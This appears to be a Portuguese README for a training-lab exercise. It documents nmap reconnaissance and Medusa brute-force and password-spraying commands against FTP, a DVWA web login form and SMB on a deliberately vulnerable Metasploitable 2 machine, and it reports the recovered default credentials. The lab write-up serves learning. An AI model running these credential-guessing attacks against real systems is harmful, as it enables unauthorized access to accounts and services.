# Simulação de Ataques de Força Bruta com Medusa

## 📌 Descrição do Projeto
Este projeto foi desenvolvido como parte do desafio prático da plataforma **DIO**. O objetivo é simular e documentar cenários de ataques de força bruta (*Brute Force*) e pulverização de senhas (*Password Spraying*) em diferentes serviços de rede utilizando a distribuição **Kali Linux** e a ferramenta **Medusa**, tendo como alvo a máquina vulnerável **Metasploitable 2**.

---

## 🛠️ Topologia do Ambiente de Testes
- **Plataforma de Virtualização:** VMware / VirtualBox (Rede Interna / Host-Only)
- **Máquina Atacante:** Kali Linux (`192.168.146.131`)
- **Máquina Alvo:** Metasploitable 2 (`192.168.146.132`)

---

## 🚀 Execução dos Testes Práticos

### 1. Mapeamento e Reconhecimento (Nmap)
Identificação dos serviços ativos e versões no host alvo:
```bash
nmap -sV -p 21,22,80,445,139 192.168.146.132
```

**Portas identificadas:**
* **21/tcp:** FTP (vsftpd 2.3.4)
* **22/tcp:** SSH (OpenSSH 4.7p1)
* **80/tcp:** HTTP (Apache httpd 2.2.8)
* **139/445/tcp:** SMB (Samba smbd 3.X - 4.X)

---

### 2. Cenário A: Força Bruta em Serviço FTP
Criação de dicionários básicos (`users.txt` e `pass.txt`) e execução do ataque automatizado contra a porta 21:

```bash
medusa -h 192.168.146.132 -U users.txt -P pass.txt -M ftp -t 6
```

**Resultado:** Credencial válida encontrada: `msfadmin:msfadmin`.

#### Validação de Acesso Manual
Acesso establishedo com sucesso via cliente nativo FTP no terminal:

```bash
ftp 192.168.146.132
```

---

### 3. Cenário B: Automação de Login em Formulário Web (DVWA / HTTP)
Execução do módulo `http` do Medusa simulando um ataque de dicionário em formulário POST de autenticação:

```bash
medusa -h 192.168.146.132 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' -t 6
```

**Resultado:** Identificação do comportamento de autenticação e credenciais válidas retornadas pelo formulário.

---

### 4. Cenário C: Password Spraying / Enumeração em SMB
Testes de autenticação no protocolo SMB/SAMBA (porta 445) utilizando múltiplos usuários e controle de threads:

```bash
medusa -h 192.168.146.132 -U smb_users.txt -P Senhas_spray.txt -M smbnt -t 2 -T 50
```

**Resultado:** Sucesso na autenticação e confirmação de privilégios de acesso ao recurso compartilhado (`msfadmin:msfadmin [SUCCESS (ADMIN$ - Access Allowed)]`).

---
